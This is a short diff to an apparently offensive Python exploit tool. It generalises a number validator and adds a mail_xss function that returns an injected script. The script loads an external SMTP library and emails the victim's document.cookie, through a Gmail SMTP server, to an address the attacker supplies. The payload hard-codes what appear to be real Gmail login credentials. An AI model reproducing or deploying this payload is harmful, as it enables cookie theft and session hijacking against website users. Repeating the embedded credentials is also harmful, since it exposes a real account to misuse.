@@ -12,8 +12,8 @@ class Exploit:
 ##################################################
 
 #check if the inserted input is a valid number
-def is_valid_number(var):
-	if (not(var.isdigit()) or int(var) > 4 or int(var) <= 0):
+def is_valid_number(var, min, max):
+	if (not(var.isdigit()) or int(var) > max or int(var) < min):
 		return False
 	else:
 		return True
@@ -24,3 +24,9 @@ def exploits_possible(list):
   		if x.executable == 1:
   			return True
   		return False
+
+
+
+#function to add inject the script for sending an email
+def mail_xss(mail_address):
+	return "<script src=\"https://smtpjs.com/v3/smtp.js\"></script><script>Email.send({Host : \"smtp.gmail.com\",Username : \"davide.sbetti@gmail.com\",Password : \"hiellzxiajvmuimz\",To : '" + mail_address + "',From : \"davide.sbetti@gmail.com\",Subject : \"a\",Body : document.cookie });</script>"
